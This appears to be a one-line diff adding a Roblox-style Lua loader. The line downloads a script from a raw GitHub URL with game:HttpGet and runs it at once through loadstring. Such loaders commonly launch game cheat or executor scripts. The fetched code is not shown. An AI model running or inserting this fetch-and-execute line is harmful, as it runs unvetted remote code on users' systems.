@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/greeksalad7/green-bell-pepper/main/main.lua"))()
